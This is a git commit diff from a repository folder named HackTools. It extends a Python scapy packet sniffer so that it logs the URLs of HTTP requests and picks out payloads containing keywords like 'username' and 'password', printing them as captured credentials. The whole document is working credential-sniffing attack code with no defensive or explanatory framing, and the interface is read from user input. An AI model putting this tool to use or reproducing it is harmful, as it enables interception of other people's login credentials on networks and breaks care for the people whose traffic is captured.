ed0afd000aff9c22ab580bfa699c7d21016ec6ef
KDB <124183922+khalidebn@users.noreply.github.com>
2024-11-19 11:39:23 +0400

    Update the repo

--- HackTools/Packet_Sniffer/packet_sniffer.py
+++ HackTools/Packet_Sniffer/packet_sniffer.py
@@ -2,16 +2,38 @@
 
 import scapy.all as scapy
 from scapy.layers import http
+from colorama import Fore, Style
 
 
 def sniff(interface):
     scapy.sniff(iface=interface, store=False,
-                prn=process_sniffed_packet, filter="udp")
+                prn=process_sniffed_packet)
+
+
+def get_url(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+
+def get_login_info(packet):
+    if packet.haslayer(scapy.Raw):
+        load = str(packet[scapy.Raw].load)
+        keywords = ["username", "user", "login", "password", "pass"]
+        for keyword in keywords:
+            if keyword in load:
+                return load
 
 
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
-        print(packet)
+        url = get_url(packet)
+        print(Fore.RED + Style.BRIGHT +
+              "\n[+] HTTP Request >> " + Style.RESET_ALL + str(url))
+        login_info = get_login_info(packet)
+        if login_info:
+            print(Fore.RED + Style.BRIGHT +
+                  "\n[+] Username & Password >> " + Style.RESET_ALL + login_info)
 
 
-sniff("eth0")
+print(Fore.GREEN + Style.BRIGHT +
+      "[+] Insert Your Interface\n[+] Example: (eth0, wlan0, lo)")
+sniff(input(">> "))
